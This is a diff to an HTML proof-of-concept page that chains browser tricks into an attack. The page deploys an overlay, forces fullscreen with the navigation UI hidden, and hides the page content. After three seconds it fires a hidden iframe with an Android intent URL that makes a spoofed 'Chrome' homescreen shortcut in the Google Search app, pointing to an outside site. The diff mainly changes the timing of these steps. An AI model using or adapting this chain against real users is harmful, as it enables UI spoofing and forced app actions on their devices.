@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate Chaining & Auto-Fade Bypass PoC</title>
+    <title>Ultimate Chaining & Delayed Intent PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -128,44 +128,41 @@
 
           statusInfo.innerText = "Status: Overlay deployed. Engaging chained Fullscreen lock...";
 
-          // 4. Chaining Step 4: Eksekusi Fullscreen dengan jeda mikro yang dioptimalkan agar menyatu dengan animasi sistem
-          setTimeout(async () => {
-            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
+          // 4. Chaining Step 4: Eksekusi Fullscreen secara bersamaan
+          let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
 
-            let requestFS = fsElement.requestFullscreen || 
-                            fsElement.webkitRequestFullscreen || 
-                            fsElement.mozRequestFullScreen || 
-                            fsElement.msRequestFullscreen;
+          let requestFS = fsElement.requestFullscreen || 
+                          fsElement.webkitRequestFullscreen || 
+                          fsElement.mozRequestFullScreen || 
+                          fsElement.msRequestFullscreen;
 
-            if (requestFS) {
+          if (requestFS) {
+            try {
+              await requestFS.call(fsElement, { navigationUI: "hide" });
+            } catch (err) {
               try {
-                await requestFS.call(fsElement, { navigationUI: "hide" });
-              } catch (err) {
-                try {
-                  await requestFS.call(fsElement);
-                } catch (e) {
-                  console.debug("Fullscreen chain fallback error:", e.message);
-                }
+                await requestFS.call(fsElement);
+              } catch (e) {
+                console.debug("Fullscreen chain fallback error:", e.message);
               }
             }
+          }
 
-            let container = document.getElementById("mainContainer");
-            if (container) {
-              container.style.display = "none";
-            }
+          let container = document.getElementById("mainContainer");
+          if (container) {
+            container.style.display = "none";
+          }
 
-            statusInfo.innerText = "Status: Full chaining active. Android intent will trigger in 3 seconds...";
+          statusInfo.innerText = "Status: Full chaining active. Android intent will run last in 3 seconds...";
 
-            // 5. Tambahan: Eksekusi Android Intent NDevTK secara otomatis 3 detik setelah Fullscreen aktif
-            setTimeout(() => {
-              statusInfo.innerText = "Status: Dispatching delayed Android intent payload...";
-              let intentFrame = document.createElement("iframe");
-              intentFrame.style.display = "none";
-              intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-              document.body.appendChild(intentFrame);
-            }, 900);
-
-          }, 300);
+          // 5. Eksekusi Android Intent NDevTK secara otomatis berjalan paling terakhir setelah 3 detik
+          setTimeout(() => {
+            statusInfo.innerText = "Status: Dispatching final Android intent payload...";
+            let intentFrame = document.createElement("iframe");
+            intentFrame.style.display = "none";
+            intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+            document.body.appendChild(intentFrame);
+          }, 3000);
 
         } catch (err) {
           statusInfo.innerText = "Status: Chaining execution error: " + err.message;
